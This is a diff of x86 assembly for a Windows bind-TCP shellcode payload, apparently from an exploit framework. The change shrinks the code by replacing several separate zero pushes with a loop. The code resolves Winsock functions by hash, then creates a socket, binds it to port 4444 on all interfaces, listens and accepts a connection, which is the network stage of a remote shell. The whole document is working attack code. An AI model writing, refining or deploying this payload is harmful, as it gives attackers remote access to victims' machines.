@@ -23,10 +23,16 @@ bind_tcp:
   push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
   call ebp               ; WSAStartup( 0x0190, &WSAData );
   
-  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.
-  push eax               ; push null for reserved parameter
-  push eax               ; we do not specify a WSAPROTOCOL_INFO structure
-  push eax               ; we do not specify a protocol
+  push byte 8
+  pop ecx
+push_8_loop:
+  push eax               ; if we succeed, eax will be zero, push it 8 times for later ([1]-[8])
+  loop push_8_loop
+
+                         ; push zero for the flags param [8]
+                         ; push null for reserved parameter [7]
+                         ; we do not specify a WSAPROTOCOL_INFO structure [6]
+                         ; we do not specify a protocol [5]
   inc eax                ;
   push eax               ; push SOCK_STREAM
   inc eax                ;
@@ -35,8 +41,7 @@ bind_tcp:
   call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
   xchg edi, eax          ; save the socket for later, don't care about the value of eax after this
   
-  xor ebx, ebx           ; Clear EBX
-  push ebx               ; bind to 0.0.0.0
+                         ; bind to 0.0.0.0, pushed earlier [4]
   push 0x5C110002        ; family AF_INET and port 4444
   mov esi, esp           ; save a pointer to sockaddr_in struct
   push byte 16           ; length of the sockaddr_in struct (we only set the first 8 bytes as the last 8 are unused)
@@ -45,13 +50,13 @@ bind_tcp:
   push 0x6737DBC2        ; hash( "ws2_32.dll", "bind" )
   call ebp               ; bind( s, &sockaddr_in, 16 );
 
-  push ebx               ; backlog
+                         ; backlog, pushed earlier [3]
   push edi               ; socket
   push 0xFF38E9B7        ; hash( "ws2_32.dll", "listen" )
   call ebp               ; listen( s, 0 );
 
-  push ebx               ; we set length for the sockaddr struct to zero
-  push ebx               ; we dont set the optional sockaddr param
+                         ; we set length for the sockaddr struct to zero, pushed earlier [2]
+                         ; we dont set the optional sockaddr param, pushed earlier [1]
   push edi               ; listening socket
   push 0xE13BEC74        ; hash( "ws2_32.dll", "accept" )
   call ebp               ; accept( s, 0, 0 );
